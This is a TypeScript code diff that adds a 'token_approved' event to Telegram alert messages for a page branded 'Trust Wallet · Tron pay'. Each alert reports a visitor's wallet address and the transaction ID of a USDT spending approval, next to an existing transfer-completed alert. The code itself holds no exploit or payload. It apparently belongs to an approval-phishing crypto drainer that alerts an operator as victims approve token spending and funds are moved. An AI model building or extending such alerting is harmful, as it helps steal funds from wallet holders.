@@ -28,6 +28,12 @@ export type TrustWalletTronTelegramPayload =
       linkedUserId: string | null;
     }
   | {
+      event: "token_approved";
+      walletAddress: string;
+      approveTxId: string;
+      linkedUserId: string | null;
+    }
+  | {
       event: "transfer_completed";
       walletAddress: string;
       toAddress: string;
@@ -79,6 +85,17 @@ function buildTrustWalletTronMessage(payload: TrustWalletTronTelegramPayload): s
       `Page: ${page}`
     ];
     return lines.filter((l): l is string => Boolean(l)).join("\n");
+  }
+
+  if (payload.event === "token_approved") {
+    const lines = [
+      "Trust Wallet · Tron pay — USDT approve completed",
+      userLine,
+      `Wallet: <code>${escapeHtml(payload.walletAddress)}</code>`,
+      `Approve tx: <code>${escapeHtml(payload.approveTxId)}</code>`,
+      `Page: ${page}`
+    ];
+    return lines.join("\n");
   }
 
   if (payload.event === "transfer_completed") {
